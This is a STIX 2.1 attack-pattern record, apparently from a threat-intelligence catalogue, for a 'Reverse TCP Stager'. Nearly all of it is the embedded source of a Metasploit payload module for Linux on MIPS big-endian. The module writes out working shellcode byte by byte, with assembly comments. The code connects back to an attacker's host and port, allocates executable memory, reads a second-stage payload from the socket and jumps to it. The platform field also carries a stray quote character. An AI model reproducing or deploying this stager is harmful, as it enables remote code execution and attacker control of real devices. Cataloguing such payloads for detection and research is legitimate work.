{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--071c9662-dc86-4b32-9a58-d6c11f70851a",
    "created": "2024-08-14T16:33:19.524579Z",
    "modified": "2024-08-14T16:33:19.524583Z",
    "name": "Reverse TCP Stager",
    "description": "Connect back to the attacker",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/linux/mipsbe/reverse_tcp.rb",
            "external_id": "reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 272\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Reverse TCP Stager',\n      'Description'   => 'Connect back to the attacker',\n      'Author'        =>\n        [\n          'juan vazquez',\n          'tkmru'\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_MIPSBE,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LHOST' => [ [66, 70], 'ADDR16MSB' ],\n              'LPORT' => [ 58, 'n' ],\n            },\n          'Payload' =>\n            \"\\x24\\x0f\\xff\\xfa\" +  #  li  t7,-6\n            \"\\x01\\xe0\\x78\\x27\" +  #  nor t7,t7,zero\n            \"\\x21\\xe4\\xff\\xfd\" +  #  addi    a0,t7,-3\n            \"\\x21\\xe5\\xff\\xfd\" +  #  addi    a1,t7,-3\n            \"\\x28\\x06\\xff\\xff\" +  #  slti    a2,zero,-1\n            \"\\x24\\x02\\x10\\x57\" +  #  li  v0,4183\n            # socket(PF_INET, SOCK_STREAM, IPPROTO_IP)\n            \"\\x01\\x01\\x01\\x0c\" +  #  syscall 0x40404\n            \"\\x00\\x07\\x80\\x2a\" +  #  slt s0,zero,a3\n            \"\\x16\\x00\\x00\\x36\" +  #  bnez    s0,0x4006bc <failed>\n            \"\\xaf\\xa2\\xff\\xfc\" +  #  sw  v0,-4(sp)\n            \"\\x8f\\xa4\\xff\\xfc\" +  #  lw  a0,-4(sp)\n            \"\\x24\\x0f\\xff\\xfd\" +  #  li  t7,-3\n            \"\\x01\\xe0\\x78\\x27\" +  #  nor t7,t7,zero\n            \"\\xaf\\xaf\\xff\\xe0\" +  #  sw  t7,-32(sp)\n            \"\\x3c\\x0e\\x11\\x5c\" +  #  lui t6,0x115c\n            \"\\xaf\\xae\\xff\\xe4\" +  #  sw  t6,-28(sp)\n            \"\\x3c\\x0e\\x7f\\x00\" +  #  lui t6,0x7f00\n            \"\\x35\\xce\\x00\\x01\" +  #  ori t6,t6,0x1\n            \"\\xaf\\xae\\xff\\xe6\" +  #  sw  t6,-26(sp)\n            \"\\x27\\xa5\\xff\\xe2\" +  #  addiu   a1,sp,-30\n            \"\\x24\\x0c\\xff\\xef\" +  #  li  t4,-17\n            \"\\x01\\x80\\x30\\x27\" +  #  nor a2,t4,zero\n            \"\\x24\\x02\\x10\\x4a\" +  #  li  v0,4170\n            # connect(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr(\"127.0.0.1\")}, 16)\n            \"\\x01\\x01\\x01\\x0c\" +  #  syscall 0x40404\n            \"\\x00\\x07\\x80\\x2a\" +  #  slt s0,zero,a3\n            \"\\x16\\x00\\x00\\x25\" +  #  bnez    s0,0x4006bc <failed>\n            \"\\x24\\x04\\xff\\xff\" +  #  li  a0,-1\n            \"\\x24\\x05\\x10\\x01\" +  #  li  a1,4097\n            \"\\x20\\xa5\\xff\\xff\" +  #  addi    a1,a1,-1\n            \"\\x24\\x09\\xff\\xf8\" +  #  li  t1,-8\n            \"\\x01\\x20\\x48\\x27\" +  #  nor t1,t1,zero\n            \"\\x01\\x20\\x30\\x20\" +  #  add a2,t1,zero\n            \"\\x24\\x07\\x08\\x02\" +  #  li  a3,2050\n            \"\\x24\\x0b\\xff\\xea\" +  #  li  t3,-22\n            \"\\x01\\x60\\x58\\x27\" +  #  nor t3,t3,zero\n            \"\\x03\\xab\\x58\\x20\" +  #  add t3,sp,t3\n            \"\\xad\\x60\\xff\\xff\" +  #  sw  zero,-1(t3)\n            \"\\xad\\x62\\xff\\xfb\" +  #  sw  v0,-5(t3)\n            \"\\x24\\x02\\x0f\\xfa\" +  #  li  v0,4090\n            # mmap(0xffffffff, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)\n            \"\\x01\\x01\\x01\\x0c\" +  #  syscall 0x40404\n            \"\\x00\\x07\\x80\\x2a\" +  #  slt s0,zero,a3\n            \"\\x16\\x00\\x00\\x15\" +  #  bnez    s0,0x4006bc <failed>\n            \"\\xaf\\xa2\\xff\\xf8\" +  #  sw  v0,-8(sp)\n            \"\\x8f\\xa4\\xff\\xfc\" +  #  lw  a0,-4(sp)\n            \"\\x8f\\xa5\\xff\\xf8\" +  #  lw  a1,-8(sp)\n            \"\\x24\\x06\\x10\\x01\" +  #  li  a2,4097\n            \"\\x20\\xc6\\xff\\xff\" +  #  addi    a2,a2,-1\n            \"\\x24\\x02\\x0f\\xa3\" +  #  li  v0,4003\n            # read(sockfd, addr, 4096)\n            \"\\x01\\x01\\x01\\x0c\" +  #  syscall 0x40404\n            \"\\x00\\x07\\x80\\x2a\" +  #  slt s0,zero,a3\n            \"\\x16\\x00\\x00\\x0c\" +  #  bnez    s0,0x4006bc <failed>\n            \"\\x8f\\xa4\\xff\\xf8\" +  #  lw  a0,-8(sp)\n            \"\\x00\\x40\\x28\\x20\" +  #  add a1,v0,zero\n            \"\\x24\\x09\\xff\\xfd\" +  #  li  t1,-3\n            \"\\x01\\x20\\x48\\x27\" +  #  nor t1,t1,zero\n            \"\\x01\\x20\\x30\\x20\" +  #  add a2,t1,zero\n            \"\\x24\\x02\\x10\\x33\" +  #  li  v0,4147\n            # cacheflush(addr, nbytes, DCACHE)\n            \"\\x01\\x01\\x01\\x0c\" +  #  syscall 0x40404\n            \"\\x00\\x07\\x80\\x2a\" +  #  slt s0,zero,a3\n            \"\\x16\\x00\\x00\\x03\" +  #  bnez    s0,0x4006bc <failed>\n            \"\\x8f\\xb1\\xff\\xf8\" +  #  lw  s1,-8(sp)\n            \"\\x8f\\xb2\\xff\\xfc\" +  #  lw  s2,-4(sp)\n            \"\\x02\\x20\\xf8\\x09\" +  #  jalr    s1\n            # 4006bc <failed>:\n            \"\\x24\\x04\\x00\\x01\" +  #  li\ta0,1\n            \"\\x24\\x02\\x0f\\xa1\" +  #  li\tv0,4001\n            # exit(status)\n            \"\\x01\\x01\\x01\\x0c\" +  #  syscall\t0x40404\n            \"\\x00\\x20\\x08\\x25\" +  #  move\tat,at\n            \"\\x00\\x20\\x08\\x25\"    #  move\tat,at\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}